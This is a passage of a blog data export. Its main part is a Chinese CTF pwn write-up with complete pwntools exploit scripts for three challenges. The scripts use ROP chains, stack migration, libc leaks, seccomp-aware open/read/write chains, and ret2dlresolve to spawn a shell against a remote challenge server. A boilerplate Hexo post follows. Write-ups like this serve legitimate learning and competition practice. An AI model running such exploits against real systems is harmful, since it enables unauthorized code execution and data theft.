class=\"line\"><span class=\"comment\"># 0x000000000040115d : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012a3 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012a1 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040101a : ret</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"stack_migration\"><a class=\"anchor\" href=\"#stack_migration\">#</a> Stack_Migration</h3>\n<p>字面意思，栈可以到处跑<br />\n正常审题程序不再罗列（checksec、IDA 看字符串啥的）。<br />\nIDA 中发现有沙箱<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png\" alt=\"\" /><br />\n依旧是发现栈溢出。<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png\" alt=\"\" /><br />\n考虑到没法直接执行 shellcode，因此只能构建 ROP 链。实现以下功能：<br />\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span>*file=<span class=\"string\">&#x27;flag&#x27;</span>;</span><br><span class=\"line\">open(file,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">read(<span class=\"number\">3</span>,file,<span class=\"number\">0x30</span>);</span><br><span class=\"line\">write(<span class=\"number\">1</span>,file,<span class=\"number\">0x30</span>);</span><br></pre></td></tr></table></figure><br />\n 这里把存储 flag 文件的名称和栈迁移之后的 ROP 链一起读入到 bss 那里。毕竟空间充足。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;8.130.110.158&#x27;</span>,<span class=\"number\">2109</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">bss_st=<span class=\"number\">0x4040A0</span></span><br><span class=\"line\">bss_tar=<span class=\"number\">0x4040A0</span>+<span class=\"number\">0x200</span></span><br><span class=\"line\">flag_name=<span class=\"number\">0x4040a0</span>+<span class=\"number\">0x200</span>-<span class=\"number\">8</span></span><br><span class=\"line\">flag_addr=bss_st+<span class=\"number\">0x300</span>-<span class=\"number\">0x40</span></span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x401373</span></span><br><span class=\"line\">pop_rsi2=<span class=\"number\">0x401371</span></span><br><span class=\"line\">leave=<span class=\"number\">0x4012e6</span></span><br><span class=\"line\"> </span><br><span class=\"line\">func_addr=elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">write_addr=elf.plt[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_addr=elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">vuln=<span class=\"number\">0x401279</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x200</span>-<span class=\"number\">0x8</span>)+<span class=\"string\">b&#x27;flag\\x00\\x00\\x00\\x00&#x27;</span>+p64(bss_tar+<span class=\"number\">0x100</span>)+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi2)+p64(func_addr)+p64(<span class=\"number\">0xdeadfeef</span>)+p64(write_addr)+p64(<span class=\"number\">0x4012a3</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;everywhere&#x27;</span>,payload1)</span><br><span class=\"line\"> </span><br><span class=\"line\">migr_pay=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+p64(bss_tar)+p64(leave)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&#x27;voice :&#x27;</span>,migr_pay)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">func_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">base=func_addr-libc.symbols[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(base))</span><br><span class=\"line\">system_addr=base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">printf_addr=base+libc.symbols[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">sh=base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\">open64_addr=base+libc.symbols[<span class=\"string\">&#x27;open64&#x27;</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdx=<span class=\"number\">0x142c92</span>+base</span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x2601f</span>+base</span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload2=p64(bss_st+<span class=\"number\">0x100</span>)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(pop_rdx)+p64(<span class=\"number\">0</span>)+p64(open64_addr)+p64(pop_rdi)+p64(<span class=\"number\">3</span>)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(<span class=\"number\">0x30</span>)+p64(read_addr)</span><br><span class=\"line\">payload2+=p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(<span class=\"number\">0x30</span>)+p64(write_addr)+p64(vuln)</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\"> </span><br><span class=\"line\">migr_pay=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+p64(bss_st)+p64(leave)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&#x27;voice :&#x27;</span>,migr_pay)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401370 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401372 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004011bd : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401373 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401371 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040101a : ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040121a : ret 0xfffe</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># in libc</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000142c92 : pop rdx ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000002601f : pop rsi ; ret</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"call-me-sys\"><a class=\"anchor\" href=\"#call-me-sys\">#</a> call me sys</h3>\n<p>syscall，但是只能用几个函数<br />\n又是沙箱：<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png\" alt=\"\" /><br />\n还是栈溢出漏洞：<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png\" alt=\"\" /><br />\n由于没有关掉 open,write,read 函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"> </span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;8.130.110.158&#x27;</span>,<span class=\"number\">2111</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">func_addr=elf.got[<span class=\"string\">&#x27;setvbuf&#x27;</span>]</span><br><span class=\"line\">syscall_ret=<span class=\"number\">0x4012ec</span></span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x401363</span></span><br><span class=\"line\">pop_rsi2=<span class=\"number\">0x401361</span></span><br><span class=\"line\"> </span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;000&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi2)+p64(func_addr)+p64(<span class=\"number\">0xdeadfeef</span>)+p64(<span class=\"number\">0x401291</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;./f1ag&#x27;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\"># p.recvuntil(b&#x27;./f1ag\\x00\\x00\\x00&#x27;)</span></span><br><span class=\"line\">func_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">base=func_addr-libc.symbols[<span class=\"string\">&#x27;setvbuf&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(func_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(base))</span><br><span class=\"line\">system_addr=base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">printf_addr=base+libc.symbols[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">sh=base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\">open64_addr=base+libc.symbols[<span class=\"string\">&#x27;open64&#x27;</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\">flag_name=<span class=\"number\">0x4040e0</span></span><br><span class=\"line\">pop_rdx=<span class=\"number\">0x142c92</span>+base</span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x2601f</span>+base</span><br><span class=\"line\">pop_rax=<span class=\"number\">0x36174</span>+base</span><br><span class=\"line\"> </span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;flag\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(pop_rax)+p64(<span class=\"number\">2</span>)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(pop_rdx)+p64(<span class=\"number\">0</span>)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(syscall_ret)+p64(pop_rax)+p64(<span class=\"number\">0</span>)+p64(pop_rdi)+p64(<span class=\"number\">3</span>)+p64(pop_rsi)+p64(flag_name+<span class=\"number\">0x20</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x30</span>)+p64(syscall_ret)+p64(pop_rax)+p64(<span class=\"number\">1</span>)+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi)+p64(flag_name+<span class=\"number\">0x20</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x30</span>)+p64(syscall_ret)+p64(<span class=\"number\">0x401270</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive(<span class=\"number\">0</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401360 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401362 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040119d : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401363 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401361 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040101a : ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040127e : ret 0x14</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012e7 : ret 0x200</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012ba : ret 0x4c</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129c : ret 0x50</span></span><br><span class=\"line\"><span class=\"comment\"># offset in libc</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000036174 : pop rax ; ret</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"close\"><a class=\"anchor\" href=\"#close\">#</a> close</h3>\n<p>Q: 你 leak 不了一点！hacker！！<br />\nA:？？？？？？<br />\n依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得 flag<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png\" alt=\"\" /><br />\n 既然我们在 get shell 之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。<br />\n于是毋庸置疑，关于泄露 libc 地址的方法直接一票否决了。<br />\n于是考虑使用 ret2dlresolve 来调用 shell。<br />\n这里使用生成的 payload<br />\n 原本是想用 system (&quot;/bin/sh&quot;) 的，但是发现 system 好像有些神秘问题导致显示：<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png\" alt=\"\" /><br />\n于是采用 execve (&quot;/bin/sh&quot;,0,0) 来获取 shell<br />\n 但是由于没有直接 pop rdx 的 gadget，我们使用 csu 来进行 rdx 的修改。（注意这里面的 call 和判断，标记起来了）：<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png\" alt=\"\" /><br />\n所以我们先把想要的 rdx 的值 pop 到 r14 里面，然后返回到 0x4012300 那里，把 r14 赋给 rdx。这里绕过判断就是让 rbx 和 rbp 值相等。这里多调试几下就 OK 了<br />\n之后就 get 到 shell 了。这时候我们要把标准输出重定向到标准错误里面，即 exec 1&gt;&amp;2<br />\nhint: 网上关于标准输出被关闭的情况，有教程：exec 1&gt;&amp;0。但是似乎 ubuntu 20 不太好使。 可以选择把输出重定向给标准错误（2）<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.binary = elf = ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">rop = ROP(context.binary)</span><br><span class=\"line\">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class=\"string\">&quot;execve&quot;</span>,args=[<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"number\">0</span>])</span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>,dlresolve.data_addr)</span><br><span class=\"line\">rop.ret2dlresolve(dlresolve)</span><br><span class=\"line\">raw_rop = rop.chain()</span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./pwn&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># io=process([&#x27;./ld-linux-x86-64.so.2&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># io=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\">io=remote(<span class=\"string\">&#x27;8.130.110.158&#x27;</span>,<span class=\"number\">7001</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">payload0 = flat(&#123;<span class=\"number\">0x98</span>:raw_rop&#125;)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;name&#x27;</span>,<span class=\"string\">&quot;fuck&quot;</span>)</span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x90</span>+p64(<span class=\"number\">0x404e90</span>)+p64(<span class=\"number\">0x40127c</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;response&#x27;</span>,payload1)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.sendline(dlresolve.payload.ljust(<span class=\"number\">0x90</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(<span class=\"number\">0x404ff0</span>)+p64(<span class=\"number\">0x401323</span>)+p64(<span class=\"number\">0x402018</span>)+p64(<span class=\"number\">0x40131a</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0x402018</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(elf.got[<span class=\"string\">&#x27;alarm&#x27;</span>])+p64(<span class=\"number\">0x401300</span>)+p64(<span class=\"number\">0x404e90</span>)+p64(<span class=\"number\">0x404ff0</span>)+p64(<span class=\"number\">0x401230</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+raw_rop[<span class=\"number\">40</span>:])</span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\"><span class=\"comment\"># io.sendline(dlresolve.payload)</span></span><br><span class=\"line\"><span class=\"comment\"># io=remote(&#x27;8.130.110.158&#x27;,7001)</span></span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;exec 1&gt;&amp;2&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;ls&quot;</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x404e90</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401320 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401322 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004011bd : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401323 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401321 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040101a : ret</span></span><br></pre></td></tr></table></figure></p>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/Pwn/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: 